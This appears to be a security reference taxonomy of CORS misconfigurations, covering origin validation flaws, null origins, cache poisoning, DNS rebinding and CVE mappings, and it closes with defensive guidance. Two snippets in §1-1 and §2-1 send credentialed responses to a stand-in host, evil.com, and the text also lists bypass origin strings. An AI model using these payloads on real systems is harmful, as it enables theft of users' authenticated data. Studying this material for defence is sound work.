# CORS (Cross-Origin Resource Sharing) Mutation/Variation Taxonomy

---

## Classification Structure

This taxonomy classifies the entire CORS attack surface along three orthogonal axes derived from systematic analysis of CVEs, bug bounty reports, academic research, and practitioner writeups.

**Axis 1 — Mutation Target (Primary Axis):** The structural component of the CORS mechanism being misconfigured or exploited. This axis organizes the main body of the document into nine categories: Origin Validation Logic, Null Origin Handling, Wildcard & Credential Interaction, CORS Header Semantics, Preflight Mechanism, Browser Parser Differentials, Protocol & Network Boundary, Cache Interaction, and Adjacent Protocol Exploitation.

**Axis 2 — Discrepancy Type (Cross-Cutting):** The nature of the mismatch or bypass each mutation creates. Every technique in the taxonomy maps to one or more of these discrepancy types:

| Discrepancy Type | Description |
|---|---|
| **Validation Bypass** | Origin check is circumvented via regex flaw, string manipulation, or logic error |
| **Trust Boundary Confusion** | An untrusted origin is elevated to trusted status through architectural weakness |
| **Parser Differential** | Browser vs. server (or server vs. server) interpret the same URL/origin differently |
| **Cache Key Mismatch** | The Origin header influences the response but is not part of the cache key |
| **Protocol Boundary Evasion** | CORS enforcement is sidestepped by switching to a protocol not governed by it |
| **Cookie/Credential Scope Mismatch** | SameSite, Domain attribute, or tracking protection rules interact unexpectedly with CORS |

**Axis 3 — Attack Scenario (Mapping):** Where the mutation is weaponized — credential theft, data exfiltration, internal network recon, cache poisoning/DoS, WAF/firewall bypass, or account takeover chains. Detailed in §10.

### Fundamental Mechanism

CORS operates as a **relaxation** of the Same-Origin Policy (SOP). The browser sends an `Origin` header; the server responds with `Access-Control-Allow-Origin` (ACAO) and optionally `Access-Control-Allow-Credentials` (ACAC). The browser enforces the policy client-side. This creates a fundamental tension: the **server decides** who can read its responses, but does so by parsing an attacker-influenced input (`Origin`). Every mutation in this taxonomy exploits some aspect of this trust delegation.

---

## §1. Origin Validation Logic Mutations

The most prevalent class of CORS vulnerabilities. The server attempts to validate the `Origin` header against an allowlist but implements the check incorrectly, allowing attacker-controlled origins to pass validation.

### §1-1. Direct Origin Reflection

The server reflects the `Origin` header value directly into `Access-Control-Allow-Origin` without any validation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Full Reflection** | `ACAO` is set to whatever value appears in the `Origin` request header | Server uses dynamic ACAO without any check |
| **Reflection with Credentials** | Full reflection combined with `ACAC: true`, allowing credentialed cross-origin reads | Server combines `ACAO: <reflected>` + `ACAC: true` |

This is the simplest and most dangerous misconfiguration. An attacker hosts a page on `evil.com` that sends a credentialed `fetch()` to the target. The target reflects `evil.com` in ACAO with credentials allowed, and the attacker reads the full response including authentication-gated data.

**Example payload:**
```javascript
fetch('https://target.com/api/account', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://evil.com/exfil?data=' + JSON.stringify(d)));
```

### §1-2. Regex-Based Validation Bypass

The server uses a regular expression to validate origins, but the regex is insufficiently anchored or overly permissive.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Suffix Match** | Regex checks if origin *ends with* the trusted domain (e.g., `/example\.com$/`) | `evilexample.com` passes validation |
| **Prefix Match** | Regex checks if origin *starts with* the trusted domain | `example.com.evil.com` passes validation |
| **Substring Match** | Regex checks if origin *contains* the trusted domain | `evil.com?example.com` or `example.com.evil.com` passes |
| **Unescaped Dot** | Dot in regex not escaped, matching any character | `exampleXcom.evil.com` passes for regex `/example.com/` |
| **Missing Anchor** | Regex lacks `^` or `$` anchors | Various bypass payloads succeed |
| **Subdomain Wildcard** | Regex allows `.*\.example\.com` without restricting depth | `evil.com.a.example.com` via subdomain takeover |

**Example bypass origins for `example.com` validation:**
```
https://evilexample.com          (suffix match)
https://example.com.evil.com     (prefix match)
https://example.computer         (TLD confusion)
https://exampleXcom.evil.com     (unescaped dot)
https://evil.com?example.com     (substring in query)
https://evil.com#example.com     (substring in fragment)
```

### §1-3. String Operation Bypass

The server uses non-regex string operations (startsWith, endsWith, contains, indexOf) for origin validation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **endsWith Bypass** | `origin.endsWith("example.com")` matches `evilexample.com` | No domain boundary check before the trusted suffix |
| **startsWith Bypass** | `origin.startsWith("https://example.com")` matches `https://example.com.evil.com` | No termination check after the trusted prefix |
| **indexOf Bypass** | `origin.indexOf("example.com") !== -1` matches any origin containing the string | No positional or boundary constraint |

### §1-4. Allowlist Implementation Errors

The server maintains an explicit allowlist but implements the lookup incorrectly.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Case Sensitivity** | Allowlist comparison is case-sensitive but browser sends lowercase | `EXAMPLE.COM` vs `example.com` mismatch |
| **Scheme Mismatch** | Allowlist stores `https://` but server doesn't check scheme | `http://` origin passes for HTTPS-only allowlist |
| **Port Omission** | Allowlist doesn't account for non-standard ports | `https://example.com:8443` vs `https://example.com` |
| **Trailing Slash/Path** | Origin with or without trailing path component causes mismatch | Implementation-dependent parsing |

---

## §2. Null Origin Exploitation

The special `Origin: null` value is sent by browsers in several legitimate contexts. Servers that whitelist `null` inadvertently trust a wide range of attacker-controlled contexts.

### §2-1. Null Origin Generation Techniques

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Sandboxed iframe** | `<iframe sandbox="allow-scripts" src="data:text/html,...">` sends `Origin: null` | Server allows `null` in ACAO |
| **data: URI** | Requests from `data:` scheme documents carry `Origin: null` | Same as above |
| **file: URI** | Local files opened in browser send `Origin: null` | Requires victim to open a local file |
| **Cross-origin redirect** | Some redirect chains cause the browser to set `Origin: null` | Specific redirect topology required |
| **Serialized opaque origin** | Any context the browser considers an "opaque origin" sends `null` | Spec-defined edge cases |

**Canonical exploitation pattern:**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    fetch('https://target.com/api/sensitive', {credentials:'include'})
    .then(r=>r.text())
    .then(d=>new Image().src='https://evil.com/steal?d='+encodeURIComponent(d))
  </script>">
</iframe>
```

### §2-2. Null Origin Trust Chains

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Development Remnant** | `null` whitelisted during development (e.g., for `file://` testing) and left in production | Common in frameworks with CORS middleware |
| **Framework Default** | CORS library defaults include `null` in allowed origins | Developer doesn't override defaults |
| **Overly Broad Parsing** | Server parses ACAO value from config, treating `null` as a valid entry rather than a special keyword | Configuration parsing quirk |

---

## §3. Wildcard & Credential Interaction

The CORS specification forbids combining `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. Mutations in this category exploit misunderstandings of this restriction or find ways to circumvent it.

### §3-1. Wildcard Misconfigurations

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Wildcard + Credential Bypass (Framework Bug)** | Framework or middleware allows setting `ACAO: *` with `ACAC: true` simultaneously, violating the spec | Vulnerable framework version (e.g., CVE-2024-25124 in Go Fiber) |
| **Wildcard on Sensitive Endpoints** | `ACAO: *` on endpoints that rely on non-cookie authentication (Bearer tokens, API keys in headers) | Authentication mechanism doesn't use cookies |
| **Wildcard Subdomain** | `ACAO: *.example.com` is not a valid CORS header value but some custom middleware implements it | Custom CORS handling interprets subdomain wildcards |

### §3-2. Credential-Inclusive Dynamic Reflection

When developers realize they can't use `*` with credentials, they implement dynamic reflection (§1-1) as a workaround, often creating a worse vulnerability.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Reflect-All-with-Credentials** | Server reflects any origin + `ACAC: true` as a "fix" for the wildcard limitation | Developer misunderstands CORS spec |
| **Conditional Credential Toggle** | Server reflects origin but only adds `ACAC: true` for "trusted" origins (with broken trust check) | Trust check is bypassable per §1-2 or §1-3 |

### §3-3. Non-Credentialed Data Exposure

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Sensitive Data Without Auth** | `ACAO: *` on endpoints that return sensitive data not protected by cookies | API returns PII, internal data, or configuration without auth |
| **Internal Network Wildcard** | Internal services use `ACAO: *` assuming network isolation provides security | Attacker gains any internal network position (§8) |

---

## §4. CORS Header Semantic Mutations

Exploitation of individual CORS response headers beyond `ACAO` and `ACAC`.

### §4-1. Exposed Headers Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Over-Exposed Custom Headers** | `Access-Control-Expose-Headers` reveals security-sensitive custom headers (tokens, internal IDs, debug info) | Server exposes headers containing sensitive data |
| **Authorization Header Leak** | `Access-Control-Expose-Headers: Authorization` allows cross-origin reading of auth tokens | Tokens returned in response headers |

### §4-2. Allowed Headers Abuse

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Reflected XSS via Custom Header** | Server reflects a custom header value in the response without encoding; `Access-Control-Allow-Headers` permits the custom header cross-origin | XSS in reflected header + CORS allows sending it |
| **Header Injection** | Server doesn't validate `Origin` for illegal characters like `\r\n`, enabling HTTP header injection | IE/Edge legacy behavior; servers that don't sanitize |

### §4-3. Allowed Methods Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Overly Permissive Methods** | `Access-Control-Allow-Methods: *` or listing dangerous methods (PUT, DELETE, PATCH) | Combines with origin bypass to enable state-changing operations |
| **Method Override** | Using `X-HTTP-Method-Override` header to convert a simple request (POST) into a non-simple method without triggering preflight | Server supports method override; CORS allows the override header |

### §4-4. Max-Age Abuse

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Excessively Long Preflight Cache** | `Access-Control-Max-Age` set to very high values, caching a permissive preflight response | Attacker triggers one successful preflight, benefits from extended cache |
| **Zero Max-Age** | `Access-Control-Max-Age: 0` forces preflight on every request, enabling DoS via request amplification | Attacker triggers many preflight + actual request pairs |

---

## §5. Preflight Mechanism Mutations

The CORS preflight (`OPTIONS` request) is the gatekeeper for non-simple requests. Mutations here bypass or weaken the preflight check.

### §5-1. Simple Request Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Content-Type Manipulation** | Keeping `Content-Type` as `text/plain`, `application/x-www-form-urlencoded`, or `multipart/form-data` to avoid triggering preflight | Server accepts these content types for API endpoints |
| **Simple Header Constraint** | Restricting request to only CORS-safelisted headers to bypass preflight entirely | Target endpoint doesn't require custom headers |
| **POST with form encoding** | Sending JSON-like payloads via `application/x-www-form-urlencoded` to avoid preflight | Server deserializes form data as JSON or accepts both |

### §5-2. Preflight Response Manipulation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Permissive OPTIONS Handler** | `OPTIONS` handler returns `ACAO: *` or reflects origin regardless of actual endpoint policy | OPTIONS and GET/POST handlers have different CORS logic |
| **Missing Preflight Handler** | Server returns 404/405 for OPTIONS but processes the actual request without CORS enforcement | Framework doesn't block the actual request when preflight fails |
| **Preflight Cache Poisoning** | Attacker's origin receives a permissive preflight response that gets cached, applying to subsequent requests from other origins | Cache doesn't key on Origin for OPTIONS responses |

### §5-3. Preflight-Free Attack Vectors

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **HTML Form Submission** | Using `<form>` with `method="POST"` bypasses CORS entirely (no Origin check on server) | Server relies on CORS instead of CSRF tokens |
| **Image/Script Tag Side-Effects** | `<img src="https://target.com/api/action">` triggers GET requests without CORS | Sensitive state-changing operations on GET endpoints |
| **Navigation-Based Requests** | `window.location` or `<a>` tag navigations don't enforce CORS | Server performs actions on navigation requests |

---

## §6. Browser Parser Differential Mutations

Different browsers parse domain names, URLs, and special characters differently. These differentials can bypass server-side origin validation that assumes uniform browser behavior.

### §6-1. Special Character Injection

| Subtype | Mechanism | Browser Affected | Key Condition |
|---------|-----------|-----------------|---------------|
| **Backtick Bypass** | Safari accepts backtick (`` ` ``) in hostnames: `http://example.com`.evil.com` — server regex may see `example.com` as the host | Safari | Server regex doesn't account for backtick as delimiter |
| **Underscore Bypass** | Chrome, Firefox, Safari accept underscores in subdomains: `http://example.com_.evil.com` | Chrome, Firefox, Safari | Regex breaks on underscore as unexpected character |
| **Curly Brace Injection** | Safari accepts `{` in hostnames: `http://example.com{.evil.com` | Safari | Parser confusion between hostname components |
| **Pipe Character** | Some browsers accept `|` in certain hostname positions | Browser-dependent | Implementation-specific parser quirk |
| **Exclamation Mark** | `!` in subdomain labels accepted by some browsers | Browser-dependent | Same as above |

**Testing methodology:** Systematically fuzz the `Origin` header with characters from the ASCII and Unicode range, testing which characters each browser sends and how the target server's regex handles them. PortSwigger's URL validation bypass cheat sheet provides comprehensive character-by-character browser behavior data.

### §6-2. URL Component Confusion

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Userinfo Confusion** | `https://example.com@evil.com` — some parsers extract `example.com` as the host, others see `evil.com` | Server parser differs from browser parser |
| **Fragment Injection** | `https://evil.com#example.com` — server string-contains check matches on fragment | Server uses indexOf/contains for validation |
| **Query Parameter Injection** | `https://evil.com?ref=example.com` — similar to fragment injection | Server uses substring matching |
| **Port Confusion** | `https://example.com:evil.com` — parser differential on port vs. hostname boundary | Non-standard URL parser |

### §6-3. Encoding Differential

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Percent-Encoding** | `%65xample.com` (encoded 'e') may bypass string comparison but resolve identically | Server compares raw strings; browser normalizes |
| **Unicode/Punycode** | IDN homograph: `exаmple.com` (Cyrillic 'а') vs `example.com` | Server validates Unicode; DNS resolves Punycode |
| **Double Encoding** | `%2565xample.com` decoded twice yields `example.com` | Server decodes once; downstream component decodes again |

---

## §7. Trust Boundary Escalation

CORS misconfigurations become critically exploitable when combined with other vulnerabilities that provide a foothold in a trusted origin.

### §7-1. Subdomain-Based Escalation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **XSS on Trusted Subdomain** | CORS trusts `*.example.com`; attacker finds XSS on `blog.example.com` and uses it to make credentialed CORS requests to `api.example.com` | Any subdomain has XSS + CORS trusts all subdomains |
| **Subdomain Takeover** | CORS trusts `*.example.com`; `old.example.com` has a dangling DNS record (CNAME to deprovisioned service) | Subdomain takeover possible + CORS trusts all subdomains |
| **Third-Party Subdomain Service** | CORS trusts subdomains; a subdomain points to a third-party service (GitHub Pages, Heroku, etc.) where attacker can host content | Third-party service allows custom content |

**Impact amplification:** Exploits hosted on subdomains automatically bypass `SameSite=Lax` cookie restrictions because they share the same registrable domain. This means subdomain-based CORS exploits can include credentials even when `SameSite` is properly configured.

### §7-2. Protocol Downgrade

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **HTTP-to-HTTPS Trust** | CORS trusts `http://example.com` alongside `https://example.com`; attacker MitMs the HTTP connection | No HSTS; CORS allows HTTP origins for HTTPS endpoints |
| **Mixed Content Exploitation** | Insecure (HTTP) subdomain trusted by secure (HTTPS) main domain | Browser allows mixed-content in certain contexts |

### §7-3. Third-Party Origin Trust

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Partner Domain Compromise** | CORS trusts a partner's domain; partner's domain is compromised or has XSS | Over-broad trust in external origins |
| **CDN Origin Trust** | CORS trusts CDN domains (e.g., `*.cloudfront.net`) shared by many tenants | Other CDN tenants can serve attacker-controlled JavaScript |
| **OAuth Provider Trust** | CORS trusts OAuth provider domains; attacker hosts content on same provider | Shared-tenant SaaS trusted as origin |

---

## §8. Network Boundary & DNS Mutations

Attacks that exploit CORS to cross network boundaries or use DNS-level techniques to circumvent origin restrictions.

### §8-1. Internal Network Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Intranet CORS Wildcard** | Internal services use `ACAO: *` assuming network perimeter provides security | Attacker's page loaded in victim's browser on internal network |
| **Localhost Service Exploitation** | Local development servers or desktop apps with web UIs use permissive CORS | Victim visits attacker's page while running local service (e.g., CVE-2024-28224 Ollama) |
| **Cloud Metadata Access** | CORS misconfiguration combined with SSRF-like patterns to access cloud metadata (169.254.169.254) | Internal service reflects CORS headers + accessible metadata endpoint |

### §8-2. Private Network Access (PNA) Bypass

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **PNA Preflight Absence** | Browsers not yet enforcing PNA preflight (Firefox, older Chrome) allow cross-origin requests to private IPs | Target browser doesn't implement PNA |
| **PNA Header Misconfiguration** | Server returns `Access-Control-Allow-Private-Network: true` without proper origin validation (CVE-2024-6221 in Flask-CORS) | Framework defaults allow private network access |
| **Router/IoT Exploitation** | Home routers and IoT devices with web interfaces lack CORS protection entirely | Victim's browser on same network as target device |

### §8-3. DNS Rebinding

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Classic DNS Rebinding** | Attacker's DNS initially resolves to attacker's IP (serves exploit page), then rebinds to target's internal IP. Browser considers it same-origin. | Target service doesn't validate Host header; DNS TTL expires |
| **TTL-Based Rebinding** | Exploits DNS TTL expiration to switch IP resolution mid-session | Low TTL on attacker's DNS record |
| **DNS Rebinding + CORS** | Attacker DNS first returns permissive CORS headers from their server, then rebinds to target. Cached CORS policy applies to target's responses. | Target service inherits cached CORS permissions |
| **Service Worker Persistence** | Combines DNS rebinding with service worker registration for persistent access | Target allows service worker registration cross-origin |

### §8-4. Typosquatting-Based Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Internal Domain Typosquat** | Register typosquat of internal corporate domain; employees who mistype the URL land on attacker's page, which probes internal CORS misconfigs | Internal services have permissive CORS; employees visit typosquat |
| **Service Worker Injection** | of-CORS technique: typosquat page registers service workers that continuously probe internal endpoints for CORS misconfigurations | Combined with browser service worker registration |

---

## §9. Cache Interaction Mutations

CORS responses that interact with caching layers can be exploited for cache poisoning, denial of service, or data leakage.

### §9-1. Missing Vary: Origin

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Cross-Origin Cache Poisoning** | Server returns origin-dependent CORS headers but no `Vary: Origin`. CDN caches the response with `ACAO: evil.com`, serving it to legitimate requests. | CDN/proxy caches response; no `Vary: Origin` header |
| **Cache Poisoning DoS** | Attacker sends request with `Origin: evil.com`, gets response cached with `ACAO: evil.com`. Legitimate cross-origin requests from trusted origins fail because cached ACAO doesn't match. | Same as above; used for denial of service |
| **Reverse Cache Poisoning** | Legitimate request cached with `ACAO: trusted.com`. Attacker's request served from cache, receives trusted ACAO value. | Origin not in cache key; response is cacheable |

### §9-2. Browser Cache Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Fetch/Navigation Cache Sharing** | Browser's private cache is shared between `fetch()` and navigation. Attacker pre-poisons cache via CORS-enabled `fetch()` with malicious headers; victim navigates to URL and receives poisoned response. | Resource is cacheable; endpoint passes preflight |
| **Preflight Cache Poisoning** | Preflight response for attacker's origin cached; subsequent requests from other origins reuse the cached preflight | Preflight cache doesn't distinguish origins properly (e.g., Mozilla Bug 1200869) |
| **Credential Flag Cache Confusion** | Same cache key generated for preflight requests differing only in credentials flag; credentialed request reuses non-credentialed preflight | Browser cache key generation bug |

### §9-3. CDN-Specific Issues

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **CDN Ignoring Vary** | CDNs like Cloudflare historically ignored `Vary` header, serving same cached response regardless of `Origin` | Specific CDN behavior |
| **Edge Cache Key Exclusion** | CDN excludes `Origin` from cache key for performance; origin-dependent responses are cached incorrectly | CDN configuration prioritizes cache hit rate |

---

## §10. Adjacent Protocol Exploitation

Protocols adjacent to HTTP that bypass or are not governed by CORS, enabling cross-origin data access.

### §10-1. WebSocket Cross-Origin Attacks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Cross-Site WebSocket Hijacking (CSWSH)** | WebSocket handshake (`Upgrade: websocket`) is not subject to CORS. Browser sends cookies with the upgrade request. Attacker's page opens WebSocket to target, gaining full read/write access. | Server doesn't validate `Origin` on WebSocket upgrade |
| **SOP Bypass via WS Protocol** | Once WebSocket connection is established (101 Switching Protocols), data transfer occurs over `ws://` / `wss://` protocol, entirely outside SOP/CORS governance | Server accepts WebSocket connections from any origin |

### §10-2. JSONP Fallback Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Legacy JSONP Endpoint** | Endpoint supports both CORS and JSONP (`?callback=`). Even with strict CORS, attacker uses `<script>` tag to load JSONP response, bypassing CORS entirely. | JSONP endpoint exists alongside CORS-protected API |
| **JSONP Callback Injection** | Callback parameter allows injection of arbitrary JavaScript | Insufficient callback sanitization |

### §10-3. postMessage & window.opener

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **postMessage Origin Bypass** | Target uses `postMessage` with wildcard `targetOrigin: "*"` or doesn't validate `event.origin` | Cross-origin communication without proper origin check |
| **window.opener Exploitation** | Page opened via `window.open()` retains `opener` reference; attacker reads/manipulates opener's state cross-origin | No `Cross-Origin-Opener-Policy` (COOP) header |

### §10-4. SameSite Cookie Interaction

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **SameSite Bypass via Subdomain** | CORS exploit hosted on subdomain of target bypasses `SameSite=Lax` because subdomains are same-site | Subdomain XSS or takeover (§7-1) |
| **Tracking Protection Interaction** | Firefox ETP and Chrome's SameSite=Lax default block third-party cookies, limiting CORS exploitation — but same-registrable-domain requests still include cookies | Exploit must be on same eTLD+1 or subdomain |
| **Top-Level Navigation with Cookie** | SameSite=Lax allows cookies on top-level GET navigations. Attacker uses `window.location` redirect to target, then reads response via CORS on a subsequent same-origin page. | Multi-step chain exploiting Lax exception |

---

## §11. Attack Scenario Mapping (Axis 3)

| Scenario | Architecture / Conditions | Primary Mutation Categories |
|----------|--------------------------|----------------------------|
| **Credential Theft / Session Hijacking** | Authenticated API with CORS misconfiguration | §1 + §2 + §3-2 |
| **Sensitive Data Exfiltration** | API returns PII/secrets with permissive CORS | §1 + §2 + §3-3 + §4-1 |
| **Internal Network Reconnaissance** | Victim browser on internal network; attacker on external | §8-1 + §8-2 + §8-3 |
| **Cache Poisoning / DoS** | CDN or proxy caching origin-dependent responses | §9-1 + §9-2 + §9-3 |
| **WAF / Firewall Bypass** | Typosquatting + CORS probing of internal services | §8-4 + §8-1 |
| **Account Takeover Chain** | CORS + XSS on subdomain + SameSite bypass | §7-1 + §10-4 + §1 |
| **State-Changing CSRF via CORS** | Non-simple request methods enabled cross-origin | §4-3 + §5-1 |
| **Local Service Exploitation** | Desktop app or dev server with web UI | §8-1 + §8-3 + §3-1 |

---

## CVE / Bounty Mapping (2024–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §1-1 + §3-2 | CVE-2024-8183 (Prefect) | Unauthorized cross-origin data access to workflow orchestration database. Data leak, loss of confidentiality. |
| §3-1 | CVE-2024-25124 (Go Fiber v2) | Framework CORS middleware allowed `ACAO: *` + `ACAC: true` simultaneously, violating spec. CVSS 9.4. |
| §1-1 + §3-2 | CVE-2024-41657 (Casdoor ≤1.577.0) | Logic vulnerability in beego CorsFilter allowed any website to make credentialed cross-origin requests. |
| §1-1 + §8-1 | CVE-2025-25301/25302 (rembg) | Weak default CORS + SSRF allowed attacker websites to reach internal network servers. |
| §1-1 | CVE-2025-55462 (Eramba) | Origin reflection with `ACAC: true` — attacker-controlled origin reflected in ACAO. |
| §8-2 | CVE-2024-6221 (Flask-CORS 4.0.1) | `Access-Control-Allow-Private-Network: true` set by default without configuration option. |
| §1-1 + §5-2 | CVE-2024-47084 (Gradio) | CORS origin validation bypassed when cookie present; any origin could access local Gradio server. |
| §8-3 | CVE-2024-28224 (Ollama) | DNS rebinding attack accessed Ollama API without authorization. Data exfiltration in ~3 seconds. |
| §8-4 + §8-1 | Tesla Internal (of-CORS) | Typosquat domain (`eslamotors.com`) probed internal network CORS misconfigs via service workers. |
| §6-1 | Yahoo View (Bug Bounty) | Safari backtick character bypass in origin validation. |
| §1-2 | Google (Bug Bounty) | Origin validation regex bypass. $2,500 bounty. |
| §9-1 | Prometheus (GitHub #15406) | Missing `Vary: Origin` enabled cache poisoning against CORS-enabled metrics endpoints. |
| §5-2 + §9-2 | Mozilla Bug 1200869 | CORS preflight cache poisoning — credential flag mismatch in cache key generation. |

---

## Detection Tools

### Offensive / Scanning

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **CORScanner** (Python) | Fast bulk CORS misconfiguration scanning | Tests origin reflection, null, prefix/suffix, subdomain trust across multiple URLs |
| **Corsy** (Python) | Lightweight CORS misconfiguration scanner | Scans all known misconfiguration patterns including special character bypasses |
| **CORStest** (Python) | Simple CORS misconfiguration detector | Tests developer backdoor, origin reflection, null, pre/post-domain wildcard |
| **Corscan** (Python) | Advanced CORS checker with WAF detection | Single/batch URL processing with dynamic bypass strategies |
| **of-CORS** (Web App) | Internal network CORS probing via typosquatting | Service worker registration + continuous internal endpoint probing |
| **Burp Suite — Trusted Domain CORS Scanner** (BApp) | In-proxy CORS testing | Implements URL validation bypass cheat sheet payloads; passive + active scanning |

### Defensive / Detection

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **PortSwigger URL Validation Bypass Cheat Sheet** | Reference for regex/parser testing | Interactive payloads for domain confusion, special characters, encoding differentials |
| **OWASP ZAP CORS Scanner** | Passive/active CORS testing in proxy | Flags permissive CORS headers during proxy traffic analysis |
| **CSP Evaluator** | Complementary policy analysis | Validates Content Security Policy that can mitigate some CORS exploitation |
| **Mozilla Observatory** | HTTP header security audit | Checks for missing security headers including CORS-related issues |

### Research / Fuzzing

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **Singularity of Origin** | DNS rebinding attack platform | Full DNS rebinding infrastructure for testing CORS + network boundary attacks |
| **BypassTrackingProtection** (GitHub) | Browser tracking protection testing | Tests cookie/credential behavior across browsers for CORS exploitation feasibility |
| **PayloadsAllTheThings — CORS** | Payload reference | Comprehensive CORS exploitation payloads organized by technique |

---

## Summary: Core Principles

**The fundamental property** that makes the entire CORS mutation space possible is the delegation of access control decisions to the server based on an **attacker-influenced input** — the `Origin` header. Unlike authentication (which verifies the user) or authorization (which verifies permissions), CORS verifies the *calling context* — and this context is trivially spoofable at the HTTP level. The browser is the sole enforcer; any non-browser client ignores CORS entirely. This creates a security model where the server must correctly implement what is essentially an origin-based ACL using string matching against an input the attacker partially controls.

**Incremental patches fail** because the attack surface is combinatorial. A server may fix regex anchoring (§1-2) but remain vulnerable to null origin (§2), or fix both but trust all subdomains (§7-1), or fix everything at the application layer but get undermined by caching (§9) or DNS rebinding (§8-3). Each CORS header (`ACAO`, `ACAC`, `ACAH`, `ACAM`, `ACEH`, `ACMA`) introduces its own mutation surface, and interactions between them multiply the risk. Browser-specific parser differentials (§6) mean that even a "correct" regex can be bypassed in specific browsers. The SameSite cookie evolution and Private Network Access specification are positive developments, but they create their own transition-period gaps where legacy behavior coexists with new restrictions.

**A structural solution** would require three shifts: (1) **Explicit opt-in** rather than opt-out — origins should be denied by default, with CORS policies defined declaratively (not via dynamic reflection), ideally in a separate security policy file rather than in application code. (2) **Cache-aware design** — CORS responses must always include `Vary: Origin`, and caching infrastructure must respect it. (3) **Defense in depth** — CORS should never be the sole security boundary. Every sensitive endpoint should validate authentication independently, use CSRF tokens for state-changing operations, and implement `SameSite` cookies, `COOP`, and `CORP` headers as layered defenses. The emerging Private Network Access specification represents the right architectural direction — treating network boundary crossing as a distinct security decision requiring explicit preflight and user consent.

---

## References

- PortSwigger, "Exploiting CORS misconfigurations for Bitcoins and bounties" — https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
- PortSwigger, "URL validation bypass cheat sheet — 2024 Edition" — https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
- Corben Leo, "Advanced CORS Exploitation Techniques" — https://www.corben.io/advanced-cors-techniques/
- HackTricks, "CORS - Misconfigurations & Bypass" — https://book.hacktricks.xyz/pentesting-web/cors-bypass
- Intigriti, "CORS Misconfigurations: Advanced Exploitation Guide" — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities
- Outpost24, "Exploiting trust: Weaponizing permissive CORS configurations" — https://outpost24.com/blog/exploiting-permissive-cors-configurations/
- PT SWARM, "Bypassing browser tracking protection for CORS misconfiguration abuse" — https://swarm.ptsecurity.com/bypassing-browser-tracking-protection-for-cors-misconfiguration-abuse/
- Truffle Security, "Bypass firewalls with of-CORs and typo-squatting" — https://trufflesecurity.com/blog/of-cors
- 0xn3va, "CORS Misconfiguration — Application Security Cheat Sheet" — https://0xn3va.gitbook.io/cheat-sheets/web-application/cors-misconfiguration
- PayloadsAllTheThings, "CORS Misconfiguration" — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
- WICG, "Private Network Access Specification" — https://wicg.github.io/private-network-access/
- Mozilla MDN, "Cross-Origin Resource Sharing (CORS)" — https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS
- PortSwigger Web Security Academy, "CORS" — https://portswigger.net/web-security/cors
- OWASP, "Testing Cross Origin Resource Sharing" — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing

---

*This document was created for defensive security research and vulnerability understanding purposes.*
